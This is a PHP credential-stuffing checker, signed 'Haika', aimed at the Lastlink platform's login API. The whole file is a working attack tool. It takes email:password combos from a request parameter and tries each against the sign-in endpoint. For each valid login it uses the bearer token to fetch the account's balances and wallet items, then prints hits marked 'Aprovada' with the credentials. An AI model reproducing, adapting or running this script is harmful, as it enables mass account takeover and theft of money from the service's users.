<?php

/// Api Atualizada Em 2023 By Haika <3

error_reporting(0);

function puxarbyhaika($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

function multiexplode($delimiters, $string)
{
  $ready = str_replace($delimiters, $delimiters[0], $string);
  $launch = explode($delimiters[0], $ready);
  return $launch;
}

$lista = $_GET['lista'];

$explode = multiexplode(array(':', '|', '/', '>'), $lista);

$email = $explode[0];
$senha = $explode[1];

if(is_null($email) or empty($senha)){
echo '<br><span class="badge badge-danger">Error</span> => [Email E Senha Invalidos] => <span class="badge badge-light">@Haika.php</span></br>';
}
if (strpos($email, '@') === false) {
  echo '<br><span class="badge badge-danger">Error</span> => [Email Invalido] => <span class="badge badge-light">@Haika.php</span></br>';
}

$post = [
    "email" => $email,
    "password" => $senha
];

$headers1 = array(
    'accept: application/json, text/plain, */*',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type: application/json',
    'origin: https://lastlink.com',
    'referer: https://lastlink.com/app/login',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35'
);

$url = "https://lastlink.com/api/dashboard/auth/signin-member";

$haikazx = curl_init();
curl_setopt_array($haikazx, [
CURLOPT_URL => $url,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $headers1,
CURLOPT_POSTFIELDS => json_encode($post),
]);
$request1 = curl_exec($haikazx);

$retorno = puxarbyhaika($request1, '"message":"','",');
$token = puxarbyhaika($request1, '"','"');

$headers = array(
    'accept: application/json, text/plain, */*',
    'authorization: Bearer '.$token.'',
    'referer: https://lastlink.com/app/creator/dashboard-v2',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35'
);

$url = "https://lastlink.com/api/dashboard/creator/get-balance";

$haikazx = curl_init();
curl_setopt_array($haikazx, [
CURLOPT_URL => $url,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $headers,
]);
$saldos = curl_exec($haikazx);

$headers = array(
    'accept: application/json, text/plain, */*',
    'authorization: Bearer '.$token.'',
    'referer: https://lastlink.com/app/creator/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35'
);

$url = "https://lastlink.com/api/dashboard/creator/wallet/list";

$haikazx = curl_init();
curl_setopt_array($haikazx, [
CURLOPT_URL => $url,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $headers,
]);
$fim = curl_exec($haikazx);

$saldo = puxarbyhaika($saldos, '"receivableBalance":',',');
$saldo2 = puxarbyhaika($saldos, '"receivableBalanceAffiliate":',',');
$itens = puxarbyhaika($fim, '"items":[',']}');

if(is_null($itens)){
$itens = "Sem Itens.";
}

if(stripos($fim, 'items')){
    echo '<span class="badge badge-success">#Aprovada</span> '.$email.'|'.$senha.' | <span class="badge badge-info">Retorno:</span> [ Login Efetuado Com Sucesso! ] | </span> <span class="badge badge-info">Saldo:</span> '.$saldo.' | <span class="badge badge-info">Saldo Afiniação:</span> '.$saldo2.'</span> | <span class="badge badge-info">Itens:</span> '.$itens.' | <span class="badge badge-light">@Haika.php</span></br>'; 
    return;
}
else{
echo '<br><span class="badge badge-danger">Reprovada</span> '.$email.'|'.$senha.' | <span class="badge badge-info">Retorno:</span> [ '.$retorno.' ] | <span class="badge badge-light">@Haika.php</span></br>';
}

?>
